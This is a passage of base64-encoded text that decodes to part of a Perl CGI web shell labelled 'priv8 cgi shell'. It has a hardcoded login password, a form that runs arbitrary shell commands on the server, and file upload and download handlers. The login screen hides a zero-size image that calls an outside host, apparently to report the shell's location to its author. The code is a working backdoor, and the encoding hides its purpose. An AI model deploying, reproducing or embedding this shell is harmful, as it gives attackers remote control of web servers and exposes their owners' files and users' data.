Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9u
P2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBs
b2FkIEZpbGU8L2ZvbnQ+PC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxv
YWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5Eb3dubG9hZCBG
aWxlPC9mb250PjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij48Zm9u
dCBjb2xvcj0iI0ZGMDAwMCI+RGlzY29ubmVjdDwvZm9udD48L2E+IHwNCjwvZm9udD48L3RkPg0K
PC90cj4NCjwvdGFibGU+DQo8Zm9udCBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8L2ZvbnQ+PGgxPnBh
c3M9cHJpdjg8L2gxPjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48cHJlPjxpbWcgYm9y
ZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cucHJpdjguaWJsb2dnZXIub3JnL3MucGhwPytjZ2l0ZWxu
ZXQgc2hlbGwiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiPjwvcHJlPg0KJDsNCiMnDQoJcHJpbnQgPDxF
TkQ7DQo8Y29kZT4NCg0KVHJ5aW5nICRTZXJ2ZXJOYW1lLi4uPGJyPg0KQ29ubmVjdGVkIHRvICRT
ZXJ2ZXJOYW1lPGJyPg0KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQ0KPGNvZGU+JE1lc3NhZ2UNCkVO
RA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0
IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+
DQo8YnI+bG9naW46IGFkbWluPGJyPg0KcGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJy
Pjxicj4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50
cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1l
PSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBl
PSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQo8L2ZvbnQ+DQo8Zm9udCBzaXplPSIz
Ij4NCmxvZ2luOiA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2
Ij5wcml2OCBjZ2kgc2hlbGw8L2I+PGJyPg0KcGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIj
MDA5OTAwIiBzaXplPSIzIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0
IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0K
DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRN
TCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJ
cHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNh
biBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0
KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2ll
cykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7
JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0
aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3Nl
ZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2lu
IGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXBy
aW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUN
CgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50
TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoN
CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9n
aW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBh
Z2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQg
ZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5
cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBh
c3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZF
RFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KCWVsc2Ug
IyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJ
JlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFz
c3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJ
CX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0
aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8
PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3Jp
cHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFu
ZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
JFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1p
dCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVz
ZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZp
bGVEb3dubG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDog
IlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxj
b2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlv
biI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQg
ZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBz
aXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0i
QmVnaW4iPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2Fk
IGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0K
ew0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVy
TmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5h
bWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9u
PSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxp
bnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZu
YnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpP
dmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8
aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIg
bmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9
ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91
dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3Jp
cHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBp
cw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCglpZighJFdpbk5UKQ0K
CXsNCgkJYWxhcm0oMCk7DQoJCXByaW50IDw8RU5EOw0KPC94bXA+DQoNCjxjb2RlPg0KQ29tbWFu
ZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25k
KHMpLg0KPGJyPktpbGxlZCBpdCENCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsN
CgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQg
ZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2Vy
IHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFu
ZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5
IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRp
bWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hh
bmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRo
ZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9e
XHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBj
aGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNv
bW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJDQoJCSRPbGREaXIgPSAkQ3VycmVudERpcjsNCgkJ
JENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4k
Q21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSZQcmludFBhZ2VI
ZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxA
JFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZCI7
DQoJfQ0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KCXsN
CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCgkJcHJpbnQg
IiRQcm9tcHQgJFJ1bkNvbW1hbmQ8eG1wPiI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnRE
aXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCgkJaWYoISRXaW5OVCkNCgkJ
ew0KCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJCWFsYXJtKCRDb21tYW5k
VGltZW91dER1cmF0aW9uKTsNCgkJfQ0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBv
dXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJCXsNCgkJCSR8PTE7DQoJCQkkQ29tbWFuZCAuPSAi
IHwiOw0KCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCQl3aGlsZSg8Q29tbWFu
ZE91dHB1dD4pDQoJCQl7DQoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkJcHJpbnQgIiRf
XG4iOw0KCQkJfQ0KCQkJJHw9MDsNCgkJfQ0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29t
bWFuZCBjb21wbGV0ZXMNCgkJew0KCQkJcHJpbnQgYCRDb21tYW5kYDsNCgkJfQ0KCQlpZighJFdp
bk5UKQ0KCQl7DQoJCQlhbGFybSgwKTsNCgkJfQ0KCQlwcmludCAiPC94bXA+IjsNCgl9DQoJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQg
Y29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUg
c3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMg
ZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1l
bnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2Fk
ZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsN
Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBl
eGlzdHMNCgl7DQoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8g
dGhlIGJyb3dzZXINCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJI
KiIsJDEpL2VnOw0KCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2Fk
JmY9JEZpbGVVcmwmbz1nbyI7DQoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlW
PVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQoJCSZQcmlu
dFBhZ2VIZWFkZXIoImMiKTsNCgkJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KU2VuZGluZyBGaWxl
ICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0
b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KRU5E
DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0N
CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7
DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJv
bSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2Fu
IGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmll
ZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlm
KG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7
DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNU
RE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmls
ZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQt
VHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6
ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7
IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShT
RU5ERklMRSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkmUHJpbnRQ
YWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAk
ISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9
DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxl
ZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQ0K
IyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUg
Y2FuIGJlIGRvd25sb2FkZWQuDQojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0
aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsDQojIHRoZSBmaWxlIGlz
IHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBm
